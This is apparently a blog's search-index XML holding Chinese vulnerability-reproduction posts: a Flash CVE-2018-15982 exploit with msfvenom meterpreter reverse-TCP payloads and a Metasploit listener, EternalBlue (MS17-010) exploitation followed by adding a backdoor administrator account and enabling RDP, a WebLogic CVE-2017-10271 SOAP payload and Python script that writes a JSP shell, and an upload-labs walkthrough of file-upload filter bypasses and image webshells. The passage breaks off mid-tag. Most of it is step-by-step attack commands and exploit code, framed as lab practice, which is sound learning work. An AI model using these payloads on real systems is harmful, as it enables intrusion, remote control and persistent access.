<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2018-15982任意代码执行漏洞复现</title>
      <link href="/2019/08/08/cve-2018-15982-ren-yi-dai-ma-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/08/08/cve-2018-15982-ren-yi-dai-ma-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>2018年11月29日，360高级威胁应对团队在全球范围内第一时间发现一起针对俄罗斯的APT攻击行动，通过一份俄文内容的医院员工问卷文档，携带最新的Flash 0day漏洞和具有自毁功能的专属木马程序，该漏洞（CVE-2018-15982）允许攻击者恶意制作的Flash对象在受害者的计算机上执行代码，从而获取对系统命令行的访问权限。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><ul><li>AdobeFlash Player &lt;= 31.0.0.153</li><li>AdobeFlash Player Installer&lt;= 31.0.0.108<br>（不包括AdobeFlash Player 32.0.0.101、AdobeFlash Player Installer 31.0.0.122）</li></ul><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：Linux kali (192.168.159.136)<br>靶机：windows7 x64（192.168.159.133）<br>Flash版本: Adobe Flash Player ActiveX_29.0.0.155<br>链接: <a href="https://pan.baidu.com/s/1S5hbsREkhWv_b1zyn-rQUg" target="_blank" rel="noopener">Adobe Flash Player ActiveX_29.0.0.155</a><br>提取码: c8sf<br>(注意：断网安装)</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><strong>kali:</strong></p><p><strong>git 漏洞POC</strong><br><code>git clone https://github.com/Ridter/CVE-2018-15982_EXP</code></p><p>msfvenom生成两个payload程序（32位和64位）<br><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=ZALE LPORT=4444 LHOST=192.168.159.136 -f raw &gt; 86.bin</code></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=ZALE LPORT=4444 LHOST=192.168.159.136 -f raw &gt; 64.bin</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808144511.png" alt></p><p><strong>生成POC</strong><br>将生成的两个<code>.bin</code>文件copy进下载的POC文件夹，<br>并cd进去，执行.py文件生成POC</p><pre><code>cp *.bin CVE-2018-15982_EXP/cd CVE-2018-15982_EXP/python CVE_2018_15982.py -i 86.bin -I 64.bin</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808144751.png" alt></p><p>开启apache服务，并将生成的两个文件copy进html目录</p><pre><code>systemctl start apache2.servicecp index.html /var/www/htmlcp exploit.swf /var/www/html</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145202.png" alt></p><p><strong>设置msf监听</strong></p><p>启动msf</p><p><code>msfconsole</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145436.png" alt></p><pre><code>use exploit/multi/handler set payload windows/meterpreter/reverse_tcp_rc4set lport 4444set lhost 192.168.159.136set RC4PASSWORD zaleexploit</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145507.png" alt></p><p>*<em>靶机: *</em></p><p>使用靶机访问<code>192.168.159.136/index.html</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808150229.png" alt></p><p>成功反弹session<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145952.png" alt></p><p><code>sessions -l</code><br>显示会话列表</p><p><code>sessions id</code><br>选择指定id会话<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808150006.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/197760.html" target="_blank" rel="noopener">CVE-2018-15982任意代码执行漏洞复现</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> CVE-2018-15982 </tag>
            
            <tag> 任意代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝漏洞(ms17-010)复现</title>
      <link href="/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/"/>
      <url>/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>永恒之蓝漏洞（Eternalblue）是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，无需用户进行任何操作，就可以中招。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>目前已知受影响的Windows 版本包括但不限于：<br>WindowsNT<br>Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8<br>Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 SP0</p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：kali 2.0<br>靶机：Windows 7 X64 （192.168.159.133）</p><h2 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h2><p>两种方法</p><h3 id="一、使用nmap扫描"><a href="#一、使用nmap扫描" class="headerlink" title="一、使用nmap扫描"></a>一、使用nmap扫描</h3><p><code>nmap -r 192.168.159.0/24C</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807171738.png" alt></p><h3 id="二、使用msf扫描模块"><a href="#二、使用msf扫描模块" class="headerlink" title="二、使用msf扫描模块"></a>二、使用msf扫描模块</h3><p> kali 执行 <code>msfconsole</code> 进入MSF框架</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807172414.png" alt></p><p>搜索ms17_010<br><code>search ms17_010</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807172807.png" alt></p><p>使用ms17-010扫描模块，对靶机Win7进行扫描<br>使用模块<br><code>use auxiliary/scanner/smb/smb_ms17_010</code></p><p>设置目标ip<br><code>set RHOSTS 192.168.159.133</code></p><p>执行<br><code>run</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807173247.png" alt></p><h2 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h2><p>使用模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code></p><p>设置目标ip<br><code>set RHOSTS 192.168.159.133</code></p><p>查看选项<br><code>shwo options</code></p><p>执行<br><code>exploit</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807173713.png" alt></p><p>成功拿到shell<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807174031.png" alt></p><h2 id="控制提权"><a href="#控制提权" class="headerlink" title="控制提权"></a>控制提权</h2><p>windows shell 下执行：<br>新建用户<br><code>net user dylan 123456 /add</code></p><p>添加管理组<br><code>net localgroup administrators dylan /add</code></p><p>开启远程桌面<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p><p>kali 登陆远程桌面：<br><code>rdesktop 192.168.159.133:3389</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807175105.png" alt></p><hr><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><ul><li>在线更新：开启Windows Update更新。</li><li>打补丁：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010" target="_blank" rel="noopener">点击下载</a></li></ul><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/193681.html" target="_blank" rel="noopener">永恒之蓝漏洞复现(ms17-010)</a><br><a href="https://blog.51cto.com/chenxinjie/2092754?from=timeline" target="_blank" rel="noopener">MS17-010 基于”永恒之蓝”实现Windows Getshell</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> 永恒之蓝漏洞 </tag>
            
            <tag> ms17-010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic WLS组件漏洞复现</title>
      <link href="/2019/08/06/weblogic-wls-zu-jian-lou-dong-fu-xian/"/>
      <url>/2019/08/06/weblogic-wls-zu-jian-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>漏洞编号：CVE-2017-10271</p><p>漏洞描述：<br>Weblogic的WLS Security组件对外提供webservice服务，<br>其中使用了XMLDecoder来解析用户传入的XML数据，<br>在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><p>受影响WebLogic版本：</p><ul><li>10.3.6.0.0</li><li>12.1.3.0.0</li><li>12.2.1.1.0</li><li>12.2.1.2.0</li></ul><hr><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：Windows 10 1903 x64<br>靶   机：Windows server 2008 R2 x64</p><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><h3 id="靶机配置"><a href="#靶机配置" class="headerlink" title="靶机配置"></a>靶机配置</h3><p>安装<code>jdk1.8.0_191</code>（路径不要带有空格）,并配置环境变量<br>安装 <a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-main-097127.html" target="_blank" rel="noopener">WebLogic Server 10.3.6</a><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806171919.png" alt><br>详细安装过程参考：<a href="https://wenku.baidu.com/view/938a7a56f5335a8102d220d0.html" target="_blank" rel="noopener">webLogic10.3.6安装、配置图解</a></p><p>输入配置管理员用户名和口令时设置的用户名和口令之后，<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806172423.png" alt></p><p>使用攻击机访问  <code>http://靶机ip:7001/wls-wsat/CoordinatorPortType</code><br>如出现如下界面，则搭建成功<br><strong>（注意：要把靶机上的防火墙关闭）</strong><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806172734.png" alt></p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>&lt;soapenv:Envelope     xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;    &lt;soapenv:Header&gt;       &lt;work:WorkContext    xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;           &lt;java      version=&quot;1.8&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;               &lt;void     class=&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;array    class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;                        &lt;void     index=&quot;0&quot;&gt;                           &lt;string&gt;calc&lt;/string&gt;                        &lt;/void&gt;                        &lt;void     index=&quot;1&quot;&gt;                            &lt;string&gt;&lt;/string&gt;                        &lt;/void&gt;                        &lt;void     index=&quot;2&quot;&gt;                            &lt;string&gt; &lt;/string&gt;                        &lt;/void&gt;                    &lt;/array&gt;                &lt;void     method=&quot;start&quot;/&gt;&lt;/void&gt;           &lt;/java&gt;       &lt;/work:WorkContext&gt;   &lt;/soapenv:Header&gt;    &lt;soapenv:Body/&gt;    &lt;/soapenv:Envelope&gt;</code></pre><p>攻击机访问 <code>http://靶机ip:7001/wls-wsat/CoordinatorPortType</code><br>使用Burp Suite抓包，发送到Repeater<br>使用post方法发送下方POC，并添加Content-Type:text/xml，把Cache-Control修改为no-cache<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806173735.png" alt></p><p>返回状态码 500，进入靶机查看，弹出计算机，执行calc命令成功</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806173856.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806174012.png" alt></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#! -*- coding:utf-8 -*-import requestsurl = &quot;http://192.168.159.138:7001/wls-wsat/CoordinatorPortType&quot;xml = &#39;&#39;&#39;     &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;     &lt;soapenv:Header&gt;     &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;     &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;     &lt;object class=&quot;java.io.PrintWriter&quot;&gt;      &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;     &lt;void method=&quot;println&quot;&gt;&lt;string&gt;     &lt;![CDATA[ &lt;% out.print(&quot;test&quot;); %&gt;     ]]&gt;     &lt;/string&gt;     &lt;/void&gt;     &lt;void method=&quot;close&quot;/&gt;     &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;     &lt;/work:WorkContext&gt;     &lt;/soapenv:Header&gt;    &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt;&#39;&#39;&#39;r =requests.post(url,headers={&#39;Content-Type&#39;:&#39;text/xml&#39;,&#39;Cache-Control&#39;:&#39;no-cache&#39;},data=xml)print r.status_codeprint r.text</code></pre><p>(记得修改python文件里面的ip地址)<br>直接运行 <code>python2 CVE-2017-10271.py</code> 写入一句话</p><p>访问shell<br><code>http://靶机ip:7001/bea_wls_internal/test.jsp</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806190652.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/vuls/158247.html" target="_blank" rel="noopener">WebLogic WLS组件漏洞复现</a><br><a href="https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html" target="_blank" rel="noopener">Weblogic(CVE-2017-10271)漏洞复现</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> WebLogic WLS </tag>
            
            <tag> 中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs文件上传漏洞练习</title>
      <link href="/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/"/>
      <url>/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>最近在研究文件上传漏洞，找到一个很好的靶场——<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>，<br>一个想帮你总结所有类型的上传漏洞的靶场 ，可以用docker快速搭建，闯关的过程中遇到很多问题，受益匪浅。</p><hr><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>使用docker快速搭建，docker的安装这里不再赘述。</p><p><code>docker pull c0ny1/upload-labs</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804145816.png" alt></p><p>创建容器<br><code>docker run -d -p 8000:80 c0ny1/upload-labs:latest</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804150235.png" alt></p><p>本地环境，访问<code>127.0.0.1:8000</code><br>云服务器上搭建的，访问<code>服务器ip:8000</code>（注意开放防火墙端口，阿里云服务器需要在云控制台配置开放端口）</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804150626.png" alt></p><hr><h1 id="0x03-闯关"><a href="#0x03-闯关" class="headerlink" title="0x03 闯关"></a>0x03 闯关</h1><h2 id="Pass-01（前端）"><a href="#Pass-01（前端）" class="headerlink" title="Pass-01（前端）"></a>Pass-01（前端）</h2><p>这一关是在客户端使用js对不合法图片进行检查，直接F12，把调用相关js的代码删掉，直接上传拿shell</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804151107.png" alt></p><h2 id="Pass-02（MIME）"><a href="#Pass-02（MIME）" class="headerlink" title="Pass-02（MIME）"></a>Pass-02（MIME）</h2><p>第二关主要是检查MIME，直接抓包修改Content-Type（例如：<code>image/gif</code>）上传即可</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804151431.png" alt></p><h2 id="Pass-03（特殊可解析后缀）"><a href="#Pass-03（特殊可解析后缀）" class="headerlink" title="Pass-03（特殊可解析后缀）"></a>Pass-03（特殊可解析后缀）</h2><p>第三关是黑名单禁止上传.asp|.aspx|.php|.jsp后缀文件，尝试另类文件名绕过。（phtml，php3，php4, php5, pht等）<br>直接抓包修改文件后缀，将php改为phtml，php3，php4, php5, pht等，上传成功<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804152622.png" alt></p><p>但是很鸡肋，如果服务器没有配置别名解析，上传上去是无法被解析执行的。<br>如果无法解析执行，需要修改apache配置文件。<br>这里以docker搭建的环境为例：<br>输入命令进入容器内部：</p><pre><code>docker exec -it condescending_nightingale /bin/bash # 这里的condescending_nightingale是容器的name，可以输入docker ps查看</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804153104.png" alt></p><pre><code>vim /etc/apache2/apache2.conf</code></pre><p>修改apache2配置文件，添加下面这句话<br><code>AddType application/x-httpd-php .php .phtml .phps .php3 .php5 .pht</code></p><p>退出容器内部<br><code>exit</code></p><p>重启容器，即可解析成功<br><code>docker restart condescending_nightingale</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804154224.png" alt></p><h2 id="Pass-04（htaccess）"><a href="#Pass-04（htaccess）" class="headerlink" title="Pass-04（htaccess）"></a>Pass-04（htaccess）</h2><p>这一关过滤了各种罕见后缀，但是没有过滤<code>.htaccess</code>文件<br>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，<br>即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<br>作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>启用.htaccess，需要修改<code>apache2.conf</code><strong>(同Pass-03)</strong>，启用AllowOverride.</p><p><code>AllowOverride None</code><br>改为<br><code>AllowOverride All</code></p><p>如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。<br>例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：</p><p><code>AccessFileName .config</code> </p><p>然后执行命令启用Mod_rewrite模块</p><p><code>sudo a2enmod rewrite</code></p><p>最后重启apache2</p><p><code>service apache2 restart</code></p><p>使用 快捷键<code>ctrl + p + q</code>退出容器（不会中止容器）</p><p>先上传<code>.htaccess</code>文件，文件内容如下(引号内替换成你要上传执行的文件名)：</p><pre><code>    &lt;FilesMatch &quot;cmd.jpeg&quot;&gt;      SetHandler application/x-httpd-php    &lt;/FilesMatch&gt;</code></pre><p>windows系统文件不能命名为<code>.*</code>，所以在上传的时候抓包，改文件名，删掉点前面的</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804215949.png" alt></p><p>然后上传图片木马文件  <code>cmd.jpeg</code> ，成功解析。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804220610.png" alt></p><h2 id="Pass-05（大小写）"><a href="#Pass-05（大小写）" class="headerlink" title="Pass-05（大小写）"></a>Pass-05（大小写）</h2><p>这一关把<code>.htaccess</code>后缀也禁止了，查看源代码，发现把转换成小写的代码去掉了</p><p><code>$file_ext = strtolower($file_ext); //转换为小写</code></p><p>因此我们可以上传Php、phP之类的来绕过黑名单后缀，成功上传。<br>(在Linux没有特殊配置的情况下，这种情况只有win可以解析执行，因为win会忽略大小写)</p><h2 id="Pass-06（空格）"><a href="#Pass-06（空格）" class="headerlink" title="Pass-06（空格）"></a>Pass-06（空格）</h2><p>这一关，少了这一段代码<br><code>$file_ext = trim($file_ext); //首尾去空</code></p><p>可以进行空格绕过，直接抓包修改文件名，再文件名末尾添加空格，成功上传</p><h2 id="Pass-07（点）"><a href="#Pass-07（点）" class="headerlink" title="Pass-07（点）"></a>Pass-07（点）</h2><p>这一关少了这段代码</p><p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p><p>没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过。</p><h2 id="Pass-08（-DATA）"><a href="#Pass-08（-DATA）" class="headerlink" title="Pass-08（::$DATA）"></a>Pass-08（::$DATA）</h2><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code><br>NTFS文件系统包括对备用数据流的支持，主要包括提供与Macintosh文件系统中的文件的兼容性。<br>备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。<br>上传.php::$DATA绕过。(仅限windows)</p><h2 id="Pass-09-代码审计"><a href="#Pass-09-代码审计" class="headerlink" title="Pass-09(代码审计)"></a>Pass-09(代码审计)</h2><pre><code>        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空</code></pre><p>查看源码，这里只过滤了一次，所以直接构造 <code>.php. .</code> 绕过</p><h2 id="Pass-10-双写"><a href="#Pass-10-双写" class="headerlink" title="Pass-10(双写)"></a>Pass-10(双写)</h2><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>这里是将黑名单里的后缀替换为空，可以利用双写绕过<br>构造<code>.pphpph</code>,成功上传解析执行。</p><h2 id="Pass-11（-00截断）"><a href="#Pass-11（-00截断）" class="headerlink" title="Pass-11（%00截断）"></a>Pass-11（%00截断）</h2><p><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p><p>可以参考这篇文章：<a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">PHP任意文件上传漏洞CVE-2015-2348浅析</a></p><p><code>save_path</code> 是一个可控的变量，可以使用%00截断<br>使用条件：</p><ul><li>php 版本&lt;5.3.4 才有可能存在此漏洞</li><li>php的magic_quotes_gpc为OFF状态</li></ul><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805093837.png" alt></p><h2 id="Pass-12（0x00截断）"><a href="#Pass-12（0x00截断）" class="headerlink" title="Pass-12（0x00截断）"></a>Pass-12（0x00截断）</h2><p>原理同Pass-11,只不过<code>save_path</code>是通过post传进来的，需要在Hex里修改</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805100157.png" alt></p><p>![](<a href="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805095929.png" target="_blank" rel="noopener">https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805095929.png</a></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805100023.png" alt></p><p><code>+</code>的URL编码的16进制 为2b，将2b改为00即可</p><h2 id="Pass-13（文件头）"><a href="#Pass-13（文件头）" class="headerlink" title="Pass-13（文件头）"></a>Pass-13（文件头）</h2><p>这一关通过读文件的前2个字节判断文件类型<br>直接使用 cmd命令生成图片木马上传</p><p><code>copy pikachu.gif /b + cmd.php /a cmd.gif</code></p><p>用给出的文件包含漏洞页面来测试图片马是否能正常运行！<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805103257.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805103451.png" alt></p><h2 id="Pass-14（getimagesize）"><a href="#Pass-14（getimagesize）" class="headerlink" title="Pass-14（getimagesize）"></a>Pass-14（getimagesize）</h2><p>这一关使用<code>getimagesize</code>获取文件类型，直接就可以利用图片马进行绕过。（同Pass-13）</p><h2 id="Pass-15（exif-imagetype-）"><a href="#Pass-15（exif-imagetype-）" class="headerlink" title="Pass-15（exif_imagetype()）"></a>Pass-15（exif_imagetype()）</h2><p>本关使用<code>exif_imagetype()</code>检查是否为图片文件,直接就可以利用图片马就可进行绕过。</p><h2 id="Pass-16（二次渲染）"><a href="#Pass-16（二次渲染）" class="headerlink" title="Pass-16（二次渲染）"></a>Pass-16（二次渲染）</h2><p>本关判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染<br>具体可以参考这篇文章：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">upload-labs之pass 16详细分析</a></p><p>先上传图片码，然后下载下来，用16进制编辑器打开，寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，<br>将Webshell代码插在该部分，然后上传即可<br>jpg和png很麻烦，gif直接修改没有改变的区域即可。</p><h2 id="Pass-17（条件竞争）"><a href="#Pass-17（条件竞争）" class="headerlink" title="Pass-17（条件竞争）"></a>Pass-17（条件竞争）</h2><p>本关文件先经过保存，然后判断后缀名是否在白名单中，如果不在则删除。<br>此时可以利用条件竞争在保存文件后删除文件前来执行php文件。<br>可以用burp suite中的Intruder模块同时批量上传、访问webshell，<br>将payloads中的payload type设置为Null payload，<br>Generate payload次数多点。</p><h2 id="Pass-18（条件竞争）"><a href="#Pass-18（条件竞争）" class="headerlink" title="Pass-18（条件竞争）"></a>Pass-18（条件竞争）</h2><p>和Pass-17一样，也是一个条件竞争的问题，查看源代码<br>对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名等。<br>可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p><h2 id="Pass-19（代码审计）"><a href="#Pass-19（代码审计）" class="headerlink" title="Pass-19（代码审计）"></a>Pass-19（代码审计）</h2><pre><code>$img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) {                 $is_upload = true;            }else{                $msg = &#39;上传失败！&#39;;            }</code></pre><p><code>move_uploaded_file()</code>函数中的<code>img_path</code>是由post参数<code>save_name</code>控制的，因此可以在<code>save_name</code>利用00截断绕过。</p><p>另外<strong><code>move_uploaded_file</code></strong>会忽略掉文件末尾的 <code>/.</code><br>所以可以构造 <code>cmd.php/.</code> 来绕过<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805121815.png" alt></p><h2 id="Pass-20（代码审计）"><a href="#Pass-20（代码审计）" class="headerlink" 